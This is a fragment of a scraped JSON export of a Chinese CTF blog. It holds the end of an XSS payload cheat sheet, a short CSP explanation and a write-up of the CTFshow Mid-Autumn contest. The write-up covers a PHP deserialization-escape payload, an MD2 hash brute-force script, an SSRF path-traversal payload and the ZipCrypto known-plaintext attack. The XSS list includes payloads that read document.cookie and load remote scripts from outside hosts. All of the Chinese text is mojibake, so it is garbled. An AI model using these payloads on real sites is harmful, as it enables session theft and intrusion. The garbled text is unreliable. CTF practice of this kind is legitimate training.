&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;\\&quot;;alert(&#x27;XSS&#x27;);//&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;&lt;DIV STYLE=&quot;background-image:\\0075\\0072\\006C\\0028&#x27;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029&#x27;\\0029&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;&lt;STYLE&gt;@im\\port&#x27;\\ja\\vasc\\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;&gt;&lt;XSS STYLE=&quot;xss:expression(alert(&#x27;XSS&#x27;))&quot;&gt;exp/*&lt;A STYLE=&#x27;no\\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#x27;&gt;&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;a=&quot;get&quot;;b=&quot;URL(ja\\&quot;&quot;;c=&quot;vascr&quot;;d=&quot;ipt:ale&quot;;e=&quot;rt(&#x27;XSS&#x27;);\\&quot;)&quot;;eval(a+b+c+d+e);&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(123)&quot;&gt;TESTHTML5FORMACTION&lt;form&gt;&lt;button formaction=&quot;javascript:alert(123)&quot;&gt;crosssitespt&lt;frameset onload=alert(123)&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;(&#123;0:#0=alert/#0#/#0#(123)&#125;)&lt;/script&gt;&lt;script&gt;ReferenceError.prototype.__defineGetter__(&#x27;name&#x27;, function()&#123;alert(123)&#125;),x&lt;/script&gt;&lt;script&gt;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&#x27;alert(1)&#x27;)()&lt;/script&gt;&lt;script src=&quot;#&quot;&gt;&#123;alert(1)&#125;&lt;/script&gt;;1&lt;script&gt;crypto.generateCRMFRequest(&#x27;CN=0&#x27;,0,0,null,&#x27;alert(1)&#x27;,384,null,&#x27;rsa-dual-use&#x27;)&lt;/script&gt;&lt;svg xmlns=&quot;#&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg onload=&quot;javascript:alert(123)&quot; xmlns=&quot;#&quot;&gt;&lt;/svg&gt;&lt;iframe xmlns=&quot;#&quot; src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-%253cscript%253ealert(document.cookie)%253c/script%253e&#x27;&gt;&lt;s&#x27;%2b&#x27;cript&gt;alert(document.cookie)&lt;/script&gt;&#x27;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;&#x27;&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;%22/%3E%3CBODY%20onload=&#x27;document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&#x27;%3E&#x27;; alert(document.cookie); var foo=&#x27;foo\\&#x27;; alert(document.cookie);//&#x27;;&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;&lt;img src=asdf onerror=alert(document.cookie)&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))&lt;/script&gt;&lt;video src=1 onerror=alert(1)&gt;&lt;audio src=1 onerror=alert(1)&gt; CSPCSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ çš„ä¸»è¦ç›®æ ‡æ˜¯å‡å°‘å’ŒæŠ¥å‘Š XSS æ”»å‡» ï¼ŒXSS æ”»å‡»åˆ©ç”¨äº†æµè§ˆå™¨å¯¹äºä»æœåŠ¡å™¨æ‰€è·å–çš„å†…å®¹çš„ä¿¡ä»»ã€‚æ¶æ„è„šæœ¬åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­å¾—ä»¥è¿è¡Œï¼Œå› ä¸ºæµè§ˆå™¨ä¿¡ä»»å…¶å†…å®¹æ¥æºï¼Œå³ä½¿æœ‰çš„æ—¶å€™è¿™äº›è„šæœ¬å¹¶éæ¥è‡ªäºå®ƒæœ¬è¯¥æ¥çš„åœ°æ–¹ã€‚ CSPé€šè¿‡æŒ‡å®šæœ‰æ•ˆåŸŸâ€”â€”å³æµè§ˆå™¨è®¤å¯çš„å¯æ‰§è¡Œè„šæœ¬çš„æœ‰æ•ˆæ¥æºâ€”â€”ä½¿æœåŠ¡å™¨ç®¡ç†è€…æœ‰èƒ½åŠ›å‡å°‘æˆ–æ¶ˆé™¤XSSæ”»å‡»æ‰€ä¾èµ–çš„è½½ä½“ã€‚ä¸€ä¸ªCSPå…¼å®¹çš„æµè§ˆå™¨å°†ä¼šä»…æ‰§è¡Œä»ç™½åå•åŸŸè·å–åˆ°çš„è„šæœ¬æ–‡ä»¶ï¼Œå¿½ç•¥æ‰€æœ‰çš„å…¶ä»–è„šæœ¬ (åŒ…æ‹¬å†…è”è„šæœ¬å’ŒHTMLçš„äº‹ä»¶å¤„ç†å±æ€§)ã€‚ ä½œä¸ºä¸€ç§ç»ˆæé˜²æŠ¤å½¢å¼ï¼Œå§‹ç»ˆä¸å…è®¸æ‰§è¡Œè„šæœ¬çš„ç«™ç‚¹å¯ä»¥é€‰æ‹©å…¨é¢ç¦æ­¢è„šæœ¬æ‰§è¡Œã€‚ &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"}],"author":"Lazzaro"},{"title":"CTFshow æœˆé¥¼æ¯","slug":"match-CTFshow-æœˆé¥¼æ¯","date":"2020-09-26T14:12:43.000Z","updated":"2020-09-29T12:25:47.035Z","comments":true,"path":"2020/09/26/match-CTFshow-æœˆé¥¼æ¯/","permalink":"https://lazzzaro.github.io/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/","excerpt":"","text":"â€‹ æ¯”èµ›ï¼šCTFshow æœˆé¥¼æ¯ å¹³å°ï¼šhttps://ctf.showå¼€å§‹ï¼š2020/9/25 18:00ç»“æŸï¼š2020/9/27 18:00é¢˜ç›®ï¼š web æ‚é¡¹ å¯†ç  é€†å‘ pwn è‹¥å¹²é“è§„åˆ™ï¼š1 æ¯”èµ›æœŸé—´å¯ä»¥éšæ„è®¨è®ºï¼Œwpé¡»åœ¨æ¯”èµ›ç»“æŸåå‘å¸ƒï¼Œwpç»Ÿä¸€å‘å¸ƒåœ°å€ï¼šhttps://wp.ctf.show2 å…¬å¹³ç«æŠ€ï¼Œç‹¬ç«‹æ¯”èµ›3 æœåŠ¡å™¨ä¸è¦çˆ†ç ´ï¼Œä¸è¦æ”»å‡»æœåŠ¡å™¨ï¼Œä¸è¦æ‰«æ!!!4 å¥–å“ï¼šrankæœ€é«˜çš„å¸ˆå‚…å‘æœˆé¥¼ï¼rankæœ€é«˜çš„å¸ˆå‚…å‘æœˆé¥¼ï¼rankæœ€é«˜çš„å¸ˆå‚…å‘æœˆé¥¼ï¼ å‡ºé¢˜ï¼šcrypto1+crypto2+crypto3+misc1 â€‹ WEBweb1_æ­¤å¤œåœ† ä¸€æ±Ÿæ˜¥æ°´ä½•å¹´å°½ï¼Œä¸‡å¤æ¸…å…‰æ­¤å¤œåœ† index.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;yu22x&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚ æ­£å¸¸åºåˆ—åŒ–ï¼š 1234$uname=&#x27;FirebaskyFirebasky&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); å¾—åˆ° O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; filter()å‡½æ•°ä¼šæŠŠå…¶ä¸­çš„Firebaskyæ›¿æ¢ä¸ºFirebaskyupï¼Œè€Œå­—ç¬¦ä¸²å¯¹åº”çš„é•¿åº¦å€¼ä¸å˜ï¼Œå³ O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; åœ¨unserialize()ååºåˆ—åŒ–æ—¶ï¼Œå­—ç¬¦é•¿åº¦ä¸åŸå§‹å€¼ä¸ä¸€è‡´ä¼šååºåˆ—åŒ–å¤±è´¥ï¼Œå°è¯•æŠŠå¤šå‡ºæ¥çš„éƒ¨åˆ†æ„é€ ä¸ºéœ€è¦çš„passwordå€¼ï¼Œæ—¢ä¿è¯ååºåˆ—åŒ–æ­£å¸¸æ‰§è¡Œï¼Œåˆèƒ½å°†åŸå§‹æ— ç”¨çš„ååŠéƒ¨åˆ†â€œæŒ¤å‡ºå»â€ã€‚ æ„é€ &quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;ï¼ˆé•¿åº¦ï¼š30ï¼‰ å³ 1234$uname=&#x27;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); filter()å‡½æ•°æ›¿æ¢åå¾—åˆ° O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:48:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; ç”±äºFirebaskyupFirebaskyupä¸è¶³48é•¿åº¦ï¼Œååºåˆ—åŒ–å¤±è´¥ï¼Œå¯ä»¥å¢åŠ æ„é€ çš„Firebaskyï¼Œå‡è®¾è¦æ„é€  $x$ ä¸ªFirebaskyï¼Œåˆ™æœ‰ $9x+30=(9+2)x$ï¼Œè§£å¾— $x=15$ã€‚ PAYLOAD: ?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; â€‹ web2_æ•…äººå¿ƒ ä¸‰äº”å¤œä¸­æ–°æœˆè‰²ï¼ŒäºŒåƒé‡Œå¤–æ•…äººå¿ƒ Hint: å­˜åœ¨ä¸€ä¸ªrobots.txt 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;; &#125;&#125;else&#123; echo &#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;;&#125; ä¸‰å±‚ç»•è¿‡ã€‚ ç¬¬ä¸€å±‚ is_numeric()å‡½æ•°é™å®šaå¿…é¡»ä¸ºæ•°å­—ï¼Œå¯ç”¨å­—ç¬¦ï¼š0123456789e.+-ï¼Œ strlen()å‡½æ•°é™å®šaåœ¨7ä¸ªå­—ç¬¦å†…ï¼ŒåŒæ—¶åˆè¦æ»¡è¶³a!=0å’Œa*a=0ï¼Œ è€ƒè™‘åˆ°PHPæµ®ç‚¹æ•°ç²¾åº¦æº¢å‡ºï¼Œæ„é€ aæ¥è¿‘äº0ï¼Œä¸”è¶³å¤Ÿå°çš„æ•°ï¼Œå¦‚xe-xxxçš„å½¢å¼ï¼Œ å¼€å§‹å°è¯•æ„é€ a=9e-999å¤±è´¥ï¼Œå› è¿‡å°å¯¼è‡´a=0ï¼Œç¼©å°å°æ•°ä½ä½¿aä¸æº¢å‡ºä¸”a*aæº¢å‡ºï¼Œa=9e-199æˆåŠŸã€‚ ç¬¬äºŒå±‚ çº¯çˆ†ç ´å¤´çˆ†ç‚¸éƒ½æ— æœï¼Œè°èƒ½æƒ³åˆ°ä»£ç ç±»webé¢˜ä¼šæœ‰robots.txtï¼Ÿ Is it particularly difficult to break MD2?!Iâ€™ll tell you quietly that I saw the payoad of the author.But the numbers are not clear.have fun~~~~xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) æœ‰äº†hintå¥½åŠè®¸å¤šï¼Œè€ƒè™‘PHPä¸­çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œå¯¹äº0eå¼€å¤´ä¸”åéƒ¨åˆ†çº¯æ•°å­—çš„å­—ç¬¦ä¸²ä½œ0çœ‹ï¼Œçˆ†ï¼š 12345678910111213141516171819202122from Crypto.Hash import MD2for i in range(1000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(3).encode()+b&#x27;024452&#x27;) x=h.hexdigest() if x.startswith(&#x27;0e&#x27;) and x[2:].isdigit(): print(i)print() for i in range(10000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(4).encode()+b&#x27;48399&#x27;) x=h.hexdigest() k = MD2.new() k.update(x.encode()) xx=k.hexdigest() if xx.startswith(&#x27;0e&#x27;) and xx[2:].isdigit(): print(i)#652#6034 å¾—åˆ°b=0e652024452&amp;c=0e603448399 ç¬¬ä¸‰å±‚ è¿‡ä¸¤å±‚å¾—åˆ°hintï¼š$flag=&quot;flag in /fl0g.txt&quot;; ssrfç»•è¿‡ã€‚filter_varå‡½æ•°å¯ä»¥è§£æå¤šç§åè®®ï¼Œè¯•è¯•ä¸æ˜¯httpçš„åè®®ï¼š url=0://ctfshow.com å¯ä»¥æˆåŠŸå¾—åˆ°hostå€¼ç»•è¿‡filter_varå’Œpreg_matchå‡½æ•°ã€‚ parse_urlå‡½æ•°ç”¨æ¥è§£æURLï¼Œå¹¶æŠŠURLåˆ†å‰²æˆç‰¹å®šçš„éƒ¨åˆ†ï¼Œåœ¨payloadåæ„é€ è·¯å¾„å¯ä»¥æˆåŠŸå°†è·¯å¾„å†™å…¥pathå€¼ï¼š url=0://ctfshow.com/../../../../../fl0g.txt â€‹ web3_è«è´Ÿå©µå¨Ÿ çšæ´ä¸€å¹´æƒŸæ­¤å¤œï¼Œè«æ•™å®¹æ˜“è´Ÿå©µå¨Ÿ Hint: ç¯å¢ƒå˜é‡ +linuxå­—ç¬¦ä¸²æˆªå– + é€šé…ç¬¦ Hintæ”¾å‡ºå‰ï¼Œåˆ©ç”¨é€šé…ç¬¦_çˆ†å‡ºäº†å¯†ç ï¼Œç™»å½•åä¸çŸ¥ä¸‹æ­¥ã€‚ è¿‡æ»¤äº†&#39;å’Œ(ï¼Œæ²¡æƒ³åˆ°ç»•è¿‡binaryçš„æ–¹æ³•ã€‚ çº¯ç²¹ä¸ä¼šï¼Œä»…æ˜¯ç•™å‘ã€‚ è¡¥å……ï¼šå…¨ç¨‹åœ¨æƒ³æ€ä¹ˆç»•è¿‡binaryï¼Œæ²¡æ³¨æ„å¯†ç ä½æ•°â€¦. è§£æ³•å‚è€ƒæœˆé¥¼ç‹å¸ˆå‚…wpã€‚ â€‹ MISCmisc1_å…±å©µå¨Ÿ ä½†æ„¿äººé•¿ä¹…ï¼Œåƒé‡Œå…±å©µå¨Ÿ MISCä¹‹ç‹äº‰å¤ºæˆ˜ï¼ ä¸¤å¯†ä¸€ä¸€å¯¹åº”ï¼Œå¡«å…¥ç¥ç§˜ä»£ç  Hint1: ç¥ç§˜ä»£ç ä¸­æœ‰ä¸œè¥¿ç¼ºå¤±ï¼Œå¡«è¡¥åå¼€é˜”æ€ç»´ï¼Œ / ä»…æ˜¯åˆ†éš”çº¿ Hint2: https://pan.baidu.com/ Hint3: æœ€åä¸€æ­¥ï¼šy=ax+b ã€é¢„ç•™å¾…å†™ã€‘ â€‹ misc2_æ´—å¯°ç€› å¤©å°†ä»Šå¤œæœˆï¼Œä¸€éæ´—å¯°ç€› æ¥è‡ªç¥ç§˜åŠ›é‡çš„å…¥ä¾µï¼ŒæŒæ¡æ ¸å¿ƒç§˜å¯† https://ctfshow.lanzous.com/iDybQgvymsb Hint1: æ­¥éª¤1é¢„è®¡æ—¶é—´ä¸º50åˆ†é’Ÿ Hint2: zipæ˜æ–‡æ”»å‡» Hint3: https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md Hint4: flag[0:9]==â€™flag{TriGâ€™ï¼Œå¯èƒ½å­—ä½“æ–‡ä»¶æœ‰é—®é¢˜ åŸç†ï¼š æ˜æ–‡æ”»å‡»é¡¾åæ€ä¹‰æˆ‘ä»¬éœ€è¦çŸ¥é“è§£å¯†åçš„å†…å®¹æ¥åæ¨å¯†é’¥ã€‚æ‰€ä»¥ä¸æ˜¯ä»€ä¹ˆZipå‹ç¼©åŒ…æ‹¿æ¥éƒ½å¯ä»¥å®Œå…¨åªé€šè¿‡å¤„ç†å¯†æ–‡ç ´è§£ï¼Œéœ€è¦åšä¸€äº›åˆ†æã€‚ Bihamå’ŒKocheråœ¨1994å¹´æå‡ºäº†ä¸€ç§é’ˆå¯¹ZipCryptoçš„æ˜æ–‡æ”»å‡» ï¼Œä»…éœ€12å­—èŠ‚çš„æ˜æ–‡ä¿¡æ¯å°±å¯ä»¥è¿è¡Œè¯¥ç®—æ³•ã€‚è¯¥ç®—æ³•å¾—åˆ°çš„æ˜¯ZipCryptoå†…éƒ¨çš„å¯†é’¥ï¼Œæ‰€ä»¥å’Œå¯†ç å¤æ‚åº¦æ— å…³ã€‚åªæœ‰12å­—èŠ‚æ—¶ï¼Œå¤æ‚åº¦æ˜¯ $2^{40}$ï¼Œå¤šæä¾›ä¸€å­—èŠ‚å°±å»æ‰ä¸å°‘å¯èƒ½æ€§ã€‚ Stayæå‡ºäº†æ–°çš„ä¸€ç§æ˜æ–‡æ”»å‡»æ–¹æ³•ï¼Œåªéœ€è¦4ä¸ªæ˜æ–‡å­—èŠ‚ï¼Œå¤æ‚åº¦ä¸º $2^{63}$ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å¤šä¸ªæ–‡ä»¶å¤§å¹…é™ä½å¤æ‚åº¦ã€‚Jeongæœ‰ä¸€äº›å¯¹BK94çš„æ”¹è¿›ï¼Œä»–ä»¬ä¹Ÿä½¿ç”¨äº†åŒä¸€å‹ç¼©åŒ…å†…çš„æ›´å¤šçš„æ–‡ä»¶ã€‚å› ä¸ºæ˜æ–‡çš„æ¨æ–­å¸¸å¸¸æ˜¯çœ‹æ–‡ä»¶å¤´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨æ›´å¤šæ–‡ä»¶æœ‰ä¸€å®šçš„åˆç†æ€§ã€‚Stayè¿˜å‘ç°äº†Winzipçš„éšæœºæ•°ç”Ÿæˆæ¼æ´ï¼Œå¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•æ˜æ–‡çš„æƒ…å†µä¸‹ä½¿ç”¨5ä¸ªåŒä¸€å‹ç¼©åŒ…çš„å¯†æ–‡æ–‡ä»¶ï¼Œä»¥ $2^{39}$ å¤æ‚åº¦ç ´è§£ï¼ˆ2002å¹´çš„æ–‡ç« ï¼ŒWinzipæˆ‘çŒœè‚¯å®šå·²ç»ä¿®å¤äº†ï¼‰ã€‚ ä½†æ˜¯ä¸ç®¡æ€ä¹ˆæ ·ï¼Œæ˜æ–‡æ€»æ˜¯éœ€è¦çš„ï¼Œæœ‰äº†åå‡ å­—èŠ‚çš„æ˜æ–‡ï¼ˆä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¤´ï¼Œä½†æ˜¯éœ€è¦çŸ¥é“åç§»åœ°å€ï¼‰ç”¨BK94ç ´è§£å°±éå¸¸å¯è¡Œäº†ã€‚äº‹å®ä¸Šæˆ‘æ„Ÿè§‰è·å–åå‡ å­—èŠ‚æ˜æ–‡çš„éš¾åº¦å’Œ4å­—èŠ‚å·®åˆ«ä¸å¤§ï¼Œæ‰€ä»¥æœ€ä¸»è¦çš„è¿˜æ˜¯è€ƒè™‘BK94æ–¹æ³•ã€‚æœ€å¤§çš„é—®é¢˜åœ¨äºæ€ä¹ˆè·å¾—æ˜æ–‡ã€‚æ–‡ä»¶å¤´å¾ˆå¥½çŒœï¼Œå¤§å¤šæ•°æ–‡ä»¶åå‡ ä¸ªå­—èŠ‚çš„æ–‡ä»¶å¤´è¿˜æ˜¯æ¯”è¾ƒå›ºå®šçš„ã€‚éº»çƒ¦çš„æ˜¯Zipå…ˆå‹ç¼©ååŠ å¯†ï¼Œæ˜æ–‡æ˜¯ç»è¿‡å‹ç¼©å¤„ç†çš„ã€‚å¾ˆä¹…ä»¥å‰ï¼ŒZipæ˜¯ç”¨Implodeå‹ç¼©ï¼Œå‹ç¼©åçš„å†…å®¹æ˜¯æ¯”è¾ƒå®¹æ˜“ç¡®å®šçš„ï¼Œè¿™å¤§æ¦‚ä¹Ÿå°±æ˜¯Bihamåœ¨æ–‡ç« é‡Œè¯´æœ‰200å­—èŠ‚æœªå‹ç¼©çš„æ˜æ–‡å°±å¤Ÿäº†çš„åŸå› ã€‚ç°åœ¨Zipéƒ½æ˜¯ç”¨Deflateå‹ç¼©ï¼ŒDeflateæ˜¯å·²ç»æ ‡å‡†åŒ–çš„å‹ç¼©æ ¼å¼ï¼Œå…ˆè¿è¡ŒLZ77ï¼Œå†è¿è¡Œå“ˆå¤«æ›¼ç¼–ç å™¨ ã€‚Deflateé‡‡ç”¨åŠ¨æ€å“ˆå¤«æ›¼ç¼–ç çš„æ—¶å€™ï¼Œå°†æ–‡ä»¶åˆ†ä¸ºä¸åŒçš„å—ï¼Œæ¯å—æœ€é•¿ä¸º64KBã€‚å“ˆå¤«æ›¼æ ‘åœ¨æ¯ä¸€ä¸ªå—çš„å‰éƒ¨ï¼Œæ‰€ä»¥å¦‚æœæœ‰æ–‡ä»¶å¤´éƒ¨çš„64KBï¼Œé‚£å¤§æ¦‚å¯ä»¥ç®—å‡ºå‹ç¼©åçš„æ˜æ–‡ï¼ˆè¿˜å¾—è€ƒè™‘å‹ç¼©å‚æ•°ï¼‰ã€‚Deflateå‹å‡ºæ¥çš„æ–‡ä»¶ç†µæ˜¯å¾ˆé«˜çš„ï¼Œéœ€è¦æ•´ä¸ªå—çš„ä¿¡æ¯æ‰æœ‰å¯èƒ½æ¨å‡ºå“ˆå¤«æ›¼æ ‘ï¼Œè¿™ä½¿å¾—æ˜æ–‡æ”»å‡»çš„éš¾åº¦å¤§å¤§æå‡ã€‚ è™½ç„¶çŒœæµ‹æ˜æ–‡éš¾åº¦å› Deflateçš„ä½¿ç”¨å¤§å¤§æé«˜ï¼Œä½†æ˜¯ä¹Ÿä¸æ˜¯ä¸å¯èƒ½çš„ï¼Œå…³é”®åœ¨äºä¸€äº›æ ¼å¼æœ¬æ¥å°±å·²ç»å‹ç¼©è¿‡äº†ï¼ŒDeflateå‹ä¸åŠ¨äº†ï¼Œæ”¾å¼ƒäº†æ²»ç–—ï¼ŒåŸºæœ¬ä¿ç•™äº†åŸæ–‡ã€‚ BK94çš„æ–¹æ³•å®ç°ç½‘ä¸Šæœ‰ç°æˆçš„ï¼Œæœ‰è§åˆ°æ¯”è¾ƒå¤šçš„PKCrackã€‚è¿™ä¸ªè½¯ä»¶2003å¹´çš„ï¼Œæœ‰ç‚¹è€äº†ï¼Œè¿˜å¿…é¡»æä¾›æ•´ä¸ªæ˜æ–‡æ–‡ä»¶ï¼ˆè¿™ç§æ˜¯ç”¨äºä¸€ä¸ªå¤§çš„å‹ç¼©åŒ…é‡Œæœ‰å°çš„æ–‡ä»¶äº’è”ç½‘ä¸Šæ‰¾å¾—åˆ°çš„ï¼‰ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘æ¨èå¦å¤–ä¸€ä¸ªgithubä¸Šå«kimci86è€å“¥å†™çš„ç‰ˆæœ¬ï¼Œè¿™ä½è€å“¥å†™çš„æ€§èƒ½å¥½ï¼ŒC++ä»£ç æ¼‚äº®ï¼Œé‡è¦çš„æ˜¯æä¾›äº†åç§»é€‰é¡¹ï¼Œç”¨èµ·æ¥æ›´çµæ´»ã€‚å…·ä½“ä½¿ç”¨æ–¹æ³•å‚è§ä»–ä»“åº“é‡Œçš„example/tutorial.mdã€‚ å‚è€ƒï¼šhttps://zhuanlan.zhihu.com/p/129855130 